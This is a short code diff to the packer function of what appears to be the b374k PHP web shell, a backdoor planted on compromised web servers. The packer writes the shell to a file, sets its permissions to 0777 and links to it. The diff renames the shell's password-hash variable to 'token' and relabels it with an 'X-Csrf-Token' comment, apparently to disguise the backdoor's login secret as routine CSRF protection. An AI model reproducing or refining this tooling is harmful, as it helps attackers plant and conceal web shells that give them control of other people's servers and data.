@@ -527,7 +527,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		if(!is_writable($output)) return "error : file ".$output." exists and is not writable{[|b374k|]}";
 	}
 
-	if(!empty($password)) $password = "\$GLOBALS['pass'] = \"".sha1(md5($password))."\"; // sha1(md5(pass))\n";
+	if(!empty($password)) $password = "\$GLOBALS['token'] = \"".sha1(md5($password))."\"; // X-Csrf-Token\n";
 	$cipher_key = "\$GLOBALS['cipher_key'] = \"" . $GLOBALS['cipher_key'] . "\";";
 
 	$compress_level = (int) $compress_level;
@@ -607,7 +607,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		chmod($output, 0777);
 		return "Succeeded : <a href='".$output."' target='_blank'>[ ".$output." ] Filesize : ".filesize($output)."</a>{[|b374k|]}".packer_html_safe(trim($code));
 	}
-	return "error{[|banny|]}";
+	return "error{[|b374k|]}";
 }
 
 function generateRandomString($length = 10) {
